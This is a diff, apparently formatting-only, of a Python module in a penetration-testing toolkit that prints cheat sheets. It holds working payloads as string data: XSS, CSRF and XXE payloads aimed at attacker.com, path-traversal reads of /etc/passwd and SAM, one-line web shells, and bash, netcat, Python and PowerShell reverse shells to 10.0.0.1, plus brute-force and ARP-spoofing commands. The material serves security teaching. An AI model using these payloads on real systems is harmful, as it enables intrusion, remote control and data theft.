+                    ),
                 ),
                 (
                     "<script>document.write('<script>alert(\\'XSS\\')<\\/script>')</script>",
-                    ("Nested script injection\n"
-                     "   Use: When you need to inject additional script tags\n"
-                     "   How: Uses document.write to create new script elements\n"
-                     "   Example: Complex XSS scenarios, multi-stage attacks\n"
-                     "   Real scenario: Advanced web application attacks"),
+                    (
+                        "Nested script injection\n"
+                        "   Use: When you need to inject additional script tags\n"
+                        "   How: Uses document.write to create new script elements\n"
+                        "   Example: Complex XSS scenarios, multi-stage attacks\n"
+                        "   Real scenario: Advanced web application attacks"
+                    ),
                 ),
             ],
         }
@@ -1105,9 +1186,7 @@ class CommandHelper(BaseModule):
             print("-" * len(category.encode("ascii", "ignore")))
 
             for i, (command, description) in enumerate(command_list, 1):
-                print(
-                    f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m"
-                )
+                print(f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m")
                 print(f"\033[93m   {description}\033[0m")
 
     def _display_payload_list(self, title: str, payloads: Dict[str, List[str]]):
@@ -1195,10 +1274,8 @@ class CommandHelper(BaseModule):
                 ("sqlmap -u '<url>'", "Basic SQL injection test"),
                 ("sqlmap -u '<url>' --dbs", "Enumerate databases"),
                 ("sqlmap -u '<url>' -D <db> --tables", "Enumerate tables"),
-                ("sqlmap -u '<url>' -D <db> -T <table> --columns",
-                 "Enumerate columns"),
-                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump",
-                 "Dump data"),
+                ("sqlmap -u '<url>' -D <db> -T <table> --columns", "Enumerate columns"),
+                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump", "Dump data"),
             ],
             "Request Options": [
                 ("--cookie='JSESSIONID=...'", "Use cookies"),
@@ -1236,12 +1313,14 @@ class CommandHelper(BaseModule):
             for category, command_list in categories.items():
                 for command, description in command_list:
                     if keyword in command.lower() or keyword in description.lower():
-                        results.append({
-                            "tool": tool,
-                            "category": category,
-                            "command": command,
-                            "description": description,
-                        })
+                        results.append(
+                            {
+                                "tool": tool,
+                                "category": category,
+                                "command": command,
+                                "description": description,
+                            }
+                        )
 
         return results
 
@@ -1300,13 +1379,19 @@ class CommandHelper(BaseModule):
                 name = command_names[choice]
                 print(f"\nEditing: {name}")
                 print(f"Current command: {self.custom_commands[name]['command']}")
-                print(f"Current description: {self.custom_commands[name]['description']}")
+                print(
+                    f"Current description: {self.custom_commands[name]['description']}"
+                )
 
-                new_command = self.get_user_input("New command (or press Enter to keep current): ")
+                new_command = self.get_user_input(
+                    "New command (or press Enter to keep current): "
+                )
                 if new_command:
                     self.custom_commands[name]["command"] = new_command
 
-                new_description = self.get_user_input("New description (or press Enter to keep current): ")
+                new_description = self.get_user_input(
+                    "New description (or press Enter to keep current): "
+                )
                 if new_description:
                     self.custom_commands[name]["description"] = new_description
 
@@ -1398,20 +1483,30 @@ class CommandHelper(BaseModule):
         commands = {
             "Dirb": [
                 ("dirb http://example.com", "Basic directory bruteforce"),
-                ("dirb http://example.com /usr/share/dirb/wordlists/common.txt",
-                 "Use specific wordlist"),
+                (
+                    "dirb http://example.com /usr/share/dirb/wordlists/common.txt",
+                    "Use specific wordlist",
+                ),
                 ("dirb http://example.com -X .php", "Search for PHP files"),
                 ("dirb http://example.com -r", "Recursive scan"),
             ],
             "Gobuster": [
-                ("gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt",
-                 "Basic directory bruteforce"),
-                ("gobuster dir -u http://example.com -w wordlist.txt -x php,html",
-                 "Search with extensions"),
-                ("gobuster dir -u http://example.com -w wordlist.txt -t 50",
-                 "Use 50 threads"),
-                ("gobuster vhost -u http://example.com -w subdomains.txt",
-                 "Virtual host bruteforce"),
+                (
+                    "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt",
+                    "Basic directory bruteforce",
+                ),
+                (
+                    "gobuster dir -u http://example.com -w wordlist.txt -x php,html",
+                    "Search with extensions",
+                ),
+                (
+                    "gobuster dir -u http://example.com -w wordlist.txt -t 50",
+                    "Use 50 threads",
+                ),
+                (
+                    "gobuster vhost -u http://example.com -w subdomains.txt",
+                    "Virtual host bruteforce",
+                ),
             ],
         }
 
@@ -1421,18 +1516,28 @@ class CommandHelper(BaseModule):
         """Hydra command cheatsheet"""
         commands = {
             "SSH Bruteforce": [
-                ("hydra -l username -P wordlist.txt ssh://192.168.1.1",
-                 "SSH password bruteforce"),
-                ("hydra -L users.txt -p password ssh://192.168.1.1",
-                 "SSH username bruteforce"),
-                ("hydra -l admin -P rockyou.txt ssh://192.168.1.1 -t 4",
-                 "SSH with 4 threads"),
+                (
+                    "hydra -l username -P wordlist.txt ssh://192.168.1.1",
+                    "SSH password bruteforce",
+                ),
+                (
+                    "hydra -L users.txt -p password ssh://192.168.1.1",
+                    "SSH username bruteforce",
+                ),
+                (
+                    "hydra -l admin -P rockyou.txt ssh://192.168.1.1 -t 4",
+                    "SSH with 4 threads",
+                ),
             ],
             "HTTP Forms": [
-                ("hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid'",
-                 "HTTP POST form bruteforce"),
-                ("hydra -l admin -P wordlist.txt 192.168.1.1 http-get-form '/login.php:user=^USER^&pass=^PASS^:Invalid'",
-                 "HTTP GET form bruteforce"),
+                (
+                    "hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid'",
+                    "HTTP POST form bruteforce",
+                ),
+                (
+                    "hydra -l admin -P wordlist.txt 192.168.1.1 http-get-form '/login.php:user=^USER^&pass=^PASS^:Invalid'",
+                    "HTTP GET form bruteforce",
+                ),
             ],
         }
 
@@ -1458,13 +1563,14 @@ class CommandHelper(BaseModule):
                 ("hashcat -m 0 hash.txt wordlist.txt", "MD5 cracking"),
                 ("hashcat -m 1000 hash.txt wordlist.txt", "NTLM cracking"),
                 ("hashcat -m 1800 hash.txt wordlist.txt", "SHA512 cracking"),
-                ("hashcat -m 0 hash.txt wordlist.txt -r rules.txt",
-                 "Use rule file"),
+                ("hashcat -m 0 hash.txt wordlist.txt -r rules.txt", "Use rule file"),
             ],
             "Attack Modes": [
                 ("hashcat -a 0 -m 0 hash.txt wordlist.txt", "Dictionary attack"),
-                ("hashcat -a 1 -m 0 hash.txt wordlist1.txt wordlist2.txt",
-                 "Combinator attack"),
+                (
+                    "hashcat -a 1 -m 0 hash.txt wordlist1.txt wordlist2.txt",
+                    "Combinator attack",
+                ),
                 ("hashcat -a 3 -m 0 hash.txt ?a?a?a?a", "Mask attack (4 chars)"),
             ],
         }
@@ -1482,8 +1588,10 @@ class CommandHelper(BaseModule):
             "Reconnaissance": [
                 ("airodump-ng wlan0mon", "Scan for networks"),
                 ("airodump-ng -c 6 -w capture wlan0mon", "Capture on channel 6"),
-                ("airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
-                 "Capture specific network"),
+                (
+                    "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
+                    "Capture specific network",
+                ),
             ],
         }
 
@@ -1495,8 +1603,10 @@ class CommandHelper(BaseModule):
             "Basic Usage": [
                 ("ettercap -G", "Start graphical interface"),
                 ("ettercap -T -q -i eth0", "Text interface, quiet mode"),
-                ("ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.2/",
-                 "ARP spoofing between hosts"),
+                (
+                    "ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.2/",
+                    "ARP spoofing between hosts",
+                ),
             ],
         }
 
@@ -1527,15 +1637,18 @@ class CommandHelper(BaseModule):
             "Certificate Analysis": [
                 ("openssl s_client -connect example.com:443", "Connect to SSL service"),
                 ("openssl x509 -in cert.pem -text -noout", "View certificate details"),
-                ("openssl s_client -connect example.com:443 -servername example.com",
-                 "SNI connection"),
+                (
+                    "openssl s_client -connect example.com:443 -servername example.com",
+                    "SNI connection",
+                ),
             ],
             "Key Generation": [
                 ("openssl genrsa -out private.key 2048", "Generate RSA private key"),
-                ("openssl req -new -key private.key -out request.csr",
-                 "Generate CSR"),
-                ("openssl x509 -req -in request.csr -signkey private.key -out cert.pem",
-                 "Self-sign certificate"),
+                ("openssl req -new -key private.key -out request.csr", "Generate CSR"),
+                (
+                    "openssl x509 -req -in request.csr -signkey private.key -out cert.pem",
+                    "Self-sign certificate",
+                ),
             ],
         }
 
@@ -1556,8 +1669,10 @@ class CommandHelper(BaseModule):
                 ("wget http://example.com", "Download file"),
                 ("wget -r http://example.com", "Recursive download"),
                 ("wget --user-agent='Custom' http://example.com", "Custom user agent"),
-                ("wget --no-check-certificate https://example.com",
-                 "Ignore SSL errors"),
+                (
+                    "wget --no-check-certificate https://example.com",
+                    "Ignore SSL errors",
+                ),
             ],
         }
 
@@ -1566,7 +1681,7 @@ class CommandHelper(BaseModule):
     def _owasp_top10_reference(self):
         """Display OWASP Top 10 vulnerabilities"""
         print("\n\033[93mOWASP TOP 10 VULNERABILITIES\033[0m")
-        print("\033[93m" + "="*40 + "\033[0m")
+        print("\033[93m" + "=" * 40 + "\033[0m")
 
         vulnerabilities = [
             ("A01:2021 - Broken Access Control", "Insufficient access controls"),
@@ -1588,19 +1703,19 @@ class CommandHelper(BaseModule):
     def _sql_injection_reference(self):
         """Display SQL injection reference"""
         print("\n\033[93mSQL INJECTION REFERENCE\033[0m")
-        print("\033[93m" + "="*30 + "\033[0m")
+        print("\033[93m" + "=" * 30 + "\033[0m")
         print("Use the SQL Injection Payload Generator for detailed payloads")
 
     def _xss_reference(self):
         """Display XSS reference"""
         print("\n\033[93mCROSS-SITE SCRIPTING (XSS) REFERENCE\033[0m")
-        print("\033[93m" + "="*45 + "\033[0m")
+        print("\033[93m" + "=" * 45 + "\033[0m")
         print("Use the XSS Payload Generator for detailed payloads")
 
     def _csrf_reference(self):
         """Display CSRF reference"""
         print("\n\033[93mCROSS-SITE REQUEST FORGERY (CSRF) REFERENCE\033[0m")
-        print("\033[93m" + "="*50 + "\033[0m")
+        print("\033[93m" + "=" * 50 + "\033[0m")
 
         print("\n\033[96mWhat is CSRF?\033[0m")
         print(
@@ -1612,8 +1727,10 @@ class CommandHelper(BaseModule):
         payloads = [
             ("<img src='http://attacker.com/csrf'>", "Image-based CSRF"),
             ("<iframe src='http://attacker.com/csrf'></iframe>", "Iframe-based CSRF"),
-            ("<script>document.location='http://attacker.com/csrf'</script>",
-             "JavaScript-based CSRF"),
+            (
+                "<script>document.location='http://attacker.com/csrf'</script>",
+                "JavaScript-based CSRF",
+            ),
         ]
 
         for i, (payload, desc) in enumerate(payloads, 1):
@@ -1629,7 +1746,7 @@ class CommandHelper(BaseModule):
     def _buffer_overflow_reference(self):
         """Display buffer overflow reference"""
         print("\n\033[93mBUFFER OVERFLOW REFERENCE\033[0m")
-        print("\033[93m" + "="*35 + "\033[0m")
+        print("\033[93m" + "=" * 35 + "\033[0m")
 
         print("\n\033[96mWhat is Buffer Overflow?\033[0m")
         print(
@@ -1709,7 +1826,7 @@ class CommandHelper(BaseModule):
     def _privilege_escalation_reference(self):
         """Display privilege escalation reference"""
         print("\n\033[93mPRIVILEGE ESCALATION REFERENCE\033[0m")
-        print("\033[93m" + "="*40 + "\033[0m")
+        print("\033[93m" + "=" * 40 + "\033[0m")
 
         print("\n\033[96mWhat is Privilege Escalation?\033[0m")
         print(
@@ -1815,7 +1932,7 @@ class CommandHelper(BaseModule):
     def _path_traversal_reference(self):
         """Display path traversal reference"""
         print("\n\033[93mPATH TRAVERSAL REFERENCE\033[0m")
-        print("\033[93m" + "="*35 + "\033[0m")
+        print("\033[93m" + "=" * 35 + "\033[0m")
 
         print("\n\033[96mWhat is Path Traversal?\033[0m")
         print(
@@ -1826,8 +1943,10 @@ class CommandHelper(BaseModule):
         print("\n\033[96mCommon Path Traversal Payloads:\033[0m")
         payloads = [
             ("../../../etc/passwd", "Access system files"),
-            ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-             "Access Windows system files"),
+            (
+                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                "Access Windows system files",
+            ),
             ("....//....//....//etc/passwd", "Double encoding bypass"),
             ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoding"),
             ("..%252f..%252f..%252fetc%252fpasswd", "Double URL encoding"),
@@ -1870,8 +1989,7 @@ class CommandHelper(BaseModule):
             ("/etc/hosts", "Hostname mappings"),
             ("/proc/version", "Kernel version"),
             ("/proc/cpuinfo", "CPU information"),
-            ("C:\\Windows\\System32\\drivers\\etc\\hosts",
-             "Windows hosts file"),
+            ("C:\\Windows\\System32\\drivers\\etc\\hosts", "Windows hosts file"),
             ("C:\\Windows\\System32\\config\\SAM", "Windows SAM file"),
         ]
 
@@ -1888,7 +2006,7 @@ class CommandHelper(BaseModule):
     def _command_injection_reference(self):
         """Display command injection reference"""
         print("\n\033[93mCOMMAND INJECTION REFERENCE\033[0m")
-        print("\033[93m" + "="*40 + "\033[0m")
+        print("\033[93m" + "=" * 40 + "\033[0m")
 
         print("\n\033[96mWhat is Command Injection?\033[0m")
         print(
@@ -1962,7 +2080,7 @@ class CommandHelper(BaseModule):
     def _xxe_reference(self):
         """Display XXE reference"""
         print("\n\033[93mXML EXTERNAL ENTITY (XXE) REFERENCE\033[0m")
-        print("\033[93m" + "="*50 + "\033[0m")
+        print("\033[93m" + "=" * 50 + "\033[0m")
 
         print("\n\033[96mWhat is XXE?\033[0m")
         print(
@@ -1972,14 +2090,22 @@ class CommandHelper(BaseModule):
 
         print("\n\033[96mCommon XXE Payloads:\033[0m")
         payloads = [
-            ("<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
-             "Basic file read"),
-            ("<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><test>&xxe;</test>",
-             "External DTD inclusion"),
-            ("<!DOCTYPE test [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]><test>&evil;</test>",
-             "Parameter entity"),
-            ("<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
-             "Complete XML document"),
+            (
+                "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
+                "Basic file read",
+            ),
+            (
+                "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><test>&xxe;</test>",
+                "External DTD inclusion",
+            ),
+            (
+                "<!DOCTYPE test [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]><test>&evil;</test>",
+                "Parameter entity",
+            ),
+            (
+                "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
+                "Complete XML document",
+            ),
         ]
 
         for i, (payload, desc) in enumerate(payloads, 1):
@@ -2016,8 +2142,7 @@ class CommandHelper(BaseModule):
             ("/etc/passwd", "User accounts"),
             ("/etc/hosts", "Hostname mappings"),
             ("/proc/version", "Kernel version"),
-            ("C:\\Windows\\System32\\drivers\\etc\\hosts",
-             "Windows hosts file"),
+            ("C:\\Windows\\System32\\drivers\\etc\\hosts", "Windows hosts file"),
             ("file:///dev/random", "Random data (DoS)"),
         ]
 
@@ -2034,7 +2159,7 @@ class CommandHelper(BaseModule):
     def _insecure_deserialization_reference(self):
         """Display insecure deserialization reference"""
         print("\n\033[93mINSECURE DESERIALIZATION REFERENCE\033[0m")
-        print("\033[93m" + "="*50 + "\033[0m")
+        print("\033[93m" + "=" * 50 + "\033[0m")
 
         print("\n\033[96mWhat is Insecure Deserialization?\033[0m")
         print(
@@ -2063,19 +2188,19 @@ class CommandHelper(BaseModule):
     def _generate_command_injection_payloads(self):
         """Generate command injection payloads"""
         print("\n\033[93mCOMMAND INJECTION PAYLOADS\033[0m")
-        print("\033[93m" + "="*35 + "\033[0m")
+        print("\033[93m" + "=" * 35 + "\033[0m")
         print("Use the Command Injection Reference for detailed information")
 
     def _generate_path_traversal_payloads(self):
         """Generate path traversal payloads"""
         print("\n\033[93mPATH TRAVERSAL PAYLOADS\033[0m")
-        print("\033[93m" + "="*35 + "\033[0m")
+        print("\033[93m" + "=" * 35 + "\033[0m")
         print("Use the Path Traversal Reference for detailed information")
 
     def _generate_ldap_payloads(self):
         """Generate LDAP injection payloads"""
         print("\n\033[93mLDAP INJECTION PAYLOADS\033[0m")
-        print("\033[93m" + "="*35 + "\033[0m")
+        print("\033[93m" + "=" * 35 + "\033[0m")
 
         payloads = {
             "Authentication Bypass": [
@@ -2098,13 +2223,13 @@ class CommandHelper(BaseModule):
     def _generate_xxe_payloads(self):
         """Generate XXE payloads"""
         print("\n\033[93mXXE PAYLOADS\033[0m")
-        print("\033[93m" + "="*20 + "\033[0m")
+        print("\033[93m" + "=" * 20 + "\033[0m")
         print("Use the XXE Reference for detailed information")
 
     def _port_numbers_reference(self):
         """Display common port numbers reference"""
         print("\n\033[93mCOMMON PORT NUMBERS REFERENCE\033[0m")
-        print("\033[93m" + "="*45 + "\033[0m")
+        print("\033[93m" + "=" * 45 + "\033[0m")
 
         ports = {
             "Web Services": [
@@ -2161,7 +2286,7 @@ class CommandHelper(BaseModule):
     def _network_recon_reference(self):
         """Display network reconnaissance reference"""
         print("\n\033[93mNETWORK RECONNAISSANCE REFERENCE\033[0m")
-        print("\033[93m" + "="*50 + "\033[0m")
+        print("\033[93m" + "=" * 50 + "\033[0m")
 
         print("\n\033[96mNetwork Discovery:\033[0m")
         discovery_commands = [
@@ -2188,7 +2313,7 @@ class CommandHelper(BaseModule):
     def _wireless_security_reference(self):
         """Display wireless security reference"""
         print("\n\033[93mWIRELESS SECURITY REFERENCE\033[0m")
-        print("\033[93m" + "="*45 + "\033[0m")
+        print("\033[93m" + "=" * 45 + "\033[0m")
 
         print("\n\033[96mWireless Reconnaissance:\033[0m")
         recon_commands = [
@@ -2203,8 +2328,10 @@ class CommandHelper(BaseModule):
 
         print("\n\033[96mWPA/WPA2 Attacks:\033[0m")
         wpa_commands = [
-            ("airodump-ng -c 6 --bssid <BSSID> -w capture wlan0mon",
-             "Capture handshake"),
+            (
+                "airodump-ng -c 6 --bssid <BSSID> -w capture wlan0mon",
+                "Capture handshake",
+            ),
             ("aireplay-ng -0 10 -a <BSSID> wlan0mon", "Deauth attack"),
             ("aircrack-ng -w wordlist.txt capture-01.cap", "Crack password"),
             ("hashcat -m 2500 capture.hccapx wordlist.txt", "GPU cracking"),
@@ -2216,7 +2343,7 @@ class CommandHelper(BaseModule):
     def _network_protocols_reference(self):
         """Display network protocols reference"""
         print("\n\033[93mNETWORK PROTOCOLS REFERENCE\033[0m")
-        print("\033[93m" + "="*45 + "\033[0m")
+        print("\033[93m" + "=" * 45 + "\033[0m")
 
         protocols = {
             "Application Layer": [
@@ -2250,7 +2377,7 @@ class CommandHelper(BaseModule):
     def _firewall_evasion_reference(self):
         """Display firewall evasion reference"""
         print("\n\033[93mFIREWALL EVASION REFERENCE\033[0m")
-        print("\033[93m" + "="*45 + "\033[0m")
+        print("\033[93m" + "=" * 45 + "\033[0m")
 
         print("\n\033[96mNmap Evasion Techniques:\033[0m")
         evasion_commands = [
@@ -2283,7 +2410,7 @@ class CommandHelper(BaseModule):
     def _http_status_codes_reference(self):
         """Display HTTP status codes reference"""
         print("\n\033[93mHTTP STATUS CODES REFERENCE\033[0m")
-        print("\033[93m" + "="*45 + "\033[0m")
+        print("\033[93m" + "=" * 45 + "\033[0m")
 
         status_codes = {
             "1xx - Informational": [
@@ -2333,7 +2460,7 @@ class CommandHelper(BaseModule):
     def _http_headers_reference(self):
         """Display HTTP headers reference"""
         print("\n\033[93mHTTP HEADERS REFERENCE\033[0m")
-        print("\033[93m" + "="*35 + "\033[0m")
+        print("\033[93m" + "=" * 35 + "\033[0m")
 
         headers = {
             "Request Headers": [
@@ -2367,13 +2494,16 @@ class CommandHelper(BaseModule):
     def _web_shells_reference(self):
         """Display web shells reference"""
         print("\n\033[93mWEB SHELLS REFERENCE\033[0m")
-        print("\033[93m" + "="*35 + "\033[0m")
+        print("\033[93m" + "=" * 35 + "\033[0m")
 
         print("\n\033[96mCommon Web Shells:\033[0m")
         shells = [
             ("PHP", "<?php system($_GET['cmd']); ?>"),
-            ("ASP", "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll()) %>"),
-            ("JSP", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
+            (
+                "ASP",
+                '<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>',
+            ),
+            ("JSP", '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
             ("Python", "import os; os.system(request.args.get('cmd'))"),
         ]
 
@@ -2390,14 +2520,20 @@ class CommandHelper(BaseModule):
     def _reverse_shells_reference(self):
         """Display reverse shells reference"""
         print("\n\033[93mREVERSE SHELLS REFERENCE\033[0m")
-        print("\033[93m" + "="*40 + "\033[0m")
+        print("\033[93m" + "=" * 40 + "\033[0m")
 
         print("\n\033[96mCommon Reverse Shell Commands:\033[0m")
         shells = [
             ("Bash", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"),
             ("Netcat", "nc -e /bin/bash 10.0.0.1 4242"),
-            ("Python", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"),
-            ("PowerShell", "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""),
+            (
+                "Python",
+                'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);\'',
+            ),
+            (
+                "PowerShell",
+                "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+            ),
         ]
 
         for lang, command in shells:
@@ -2407,7 +2543,10 @@ class CommandHelper(BaseModule):
         print("\n\033[96mListener Commands:\033[0m")
         listeners = [
             ("Netcat", "nc -lvp 4242"),
-            ("PowerShell", "powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4242);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\""),
+            (
+                "PowerShell",
+                "powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4242);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"",
+            ),
         ]
 
         for tool, command in listeners:
@@ -2417,11 +2556,14 @@ class CommandHelper(BaseModule):
     def _web_fuzzing_reference(self):
         """Display web fuzzing reference"""
         print("\n\033[93mWEB FUZZING REFERENCE\033[0m")
-        print("\033[93m" + "="*35 + "\033[0m")
+        print("\033[93m" + "=" * 35 + "\033[0m")
 
         print("\n\033[96mDirectory Fuzzing:\033[0m")
         dir_commands = [
-            ("gobuster dir -u http://example.com -w wordlist.txt", "Directory bruteforce"),
+            (
+                "gobuster dir -u http://example.com -w wordlist.txt",
+                "Directory bruteforce",
+            ),
             ("ffuf -w wordlist.txt -u http://example.com/FUZZ", "Fast fuzzing"),
             ("dirb http://example.com", "Classic directory bruteforce"),
             ("wfuzz -w wordlist.txt http://example.com/FUZZ", "Web fuzzer"),
@@ -2432,8 +2574,14 @@ class CommandHelper(BaseModule):
 
         print("\n\033[96mParameter Fuzzing:\033[0m")
         param_commands = [
-            ("ffuf -w wordlist.txt -u http://example.com/?param=FUZZ", "Parameter fuzzing"),
-            ("wfuzz -w wordlist.txt http://example.com/?param=FUZZ", "Parameter fuzzing"),
+            (
+                "ffuf -w wordlist.txt -u http://example.com/?param=FUZZ",
+                "Parameter fuzzing",
+            ),
+            (
+                "wfuzz -w wordlist.txt http://example.com/?param=FUZZ",
+                "Parameter fuzzing",
+            ),
             ("arjun -u http://example.com", "Parameter discovery"),
             ("parameth -u http://example.com", "Parameter discovery"),
         ]
@@ -2455,7 +2603,7 @@ class CommandHelper(BaseModule):
     def _linux_commands_card(self):
         """Display Linux commands quick reference card"""
         print("\n\033[93mLINUX COMMANDS QUICK REFERENCE\033[0m")
-        print("\033[93m" + "="*45 + "\033[0m")
+        print("\033[93m" + "=" * 45 + "\033[0m")
 
         commands = {
             "File Operations": [
@@ -2505,7 +2653,7 @@ class CommandHelper(BaseModule):
     def _windows_commands_card(self):
         """Display Windows commands quick reference card"""
         print("\n\033[93mWINDOWS COMMANDS QUICK REFERENCE\033[0m")
-        print("\033[93m" + "="*50 + "\033[0m")
+        print("\033[93m" + "=" * 50 + "\033[0m")
 
         commands = {
             "File Operations": [
@@ -2553,7 +2701,7 @@ class CommandHelper(BaseModule):
     def _powershell_commands_card(self):
         """Display PowerShell commands quick reference card"""
         print("\n\033[93mPOWERSHELL COMMANDS QUICK REFERENCE\033[0m")
-        print("\033[93m" + "="*55 + "\033[0m")
+        print("\033[93m" + "=" * 55 + "\033[0m")
 
         commands = {
             "File Operations": [
@@ -2599,7 +2747,7 @@ class CommandHelper(BaseModule):
     def _bash_scripting_card(self):
         """Display bash scripting quick reference card"""
         print("\n\033[93mBASH SCRIPTING QUICK REFERENCE\033[0m")
-        print("\033[93m" + "="*50 + "\033[0m")
+        print("\033[93m" + "=" * 50 + "\033[0m")
 
         print("\n\033[96mBasic Syntax:\033[0m")
         syntax = [
@@ -2608,7 +2756,7 @@ class CommandHelper(BaseModule):
             ("variable=value", "Variable assignment"),
             ("$variable", "Variable reference"),
             ("${variable}", "Variable reference (braces)"),
-            ("\"$variable\"", "Double quotes (expand variables)"),
+            ('"$variable"', "Double quotes (expand variables)"),
             ("'$variable'", "Single quotes (literal)"),
         ]
 
@@ -2654,7 +2802,7 @@ class CommandHelper(BaseModule):
     def _regex_reference_card(self):
         """Display regular expressions quick reference card"""
         print("\n\033[93mREGULAR EXPRESSIONS QUICK REFERENCE\033[0m")
-        print("\033[93m" + "="*55 + "\033[0m")
+        print("\033[93m" + "=" * 55 + "\033[0m")
 
         print("\n\033[96mBasic Patterns:\033[0m")
         patterns = [
@@ -2751,7 +2899,10 @@ class CommandHelper(BaseModule):
             ],
             "Advanced": [
                 {"command": "nmap -A 192.168.1.1", "description": "Aggressive scan"},
-                {"command": "nmap --script vuln 192.168.1.1", "description": "Vulnerability scan"},
+                {
+                    "command": "nmap --script vuln 192.168.1.1",
+                    "description": "Vulnerability scan",
+                },
             ],
         }
 
@@ -2769,8 +2920,14 @@ class CommandHelper(BaseModule):
         """Get SQLMap cheatsheet data"""
         return {
             "Basic Usage": [
-                {"command": "sqlmap -u '<url>'", "description": "Basic SQL injection test"},
-                {"command": "sqlmap -u '<url>' --dbs", "description": "Enumerate databases"},
+                {
+                    "command": "sqlmap -u '<url>'",
+                    "description": "Basic SQL injection test",
+                },
+                {
+                    "command": "sqlmap -u '<url>' --dbs",
+                    "description": "Enumerate databases",
+                },
             ],
         }
 
@@ -2820,14 +2977,17 @@ class CommandHelper(BaseModule):
                 f.write("Requires PDF generation library\n")
 
             self.print_success(f"PDF cheatsheet created at {filename}")
-            self.print_info("Note: This is a placeholder. Install reportlab for actual PDF generation.")
+            self.print_info(
+                "Note: This is a placeholder. Install reportlab for actual PDF generation."
+            )
 
         except Exception as e:
             self.print_error(f"PDF creation failed: {e}")
 
     def _generate_comprehensive_cheatsheet_html(self) -> str:
         """Generate comprehensive HTML cheatsheet"""
-        html_content = """
+        html_content = (
+            """
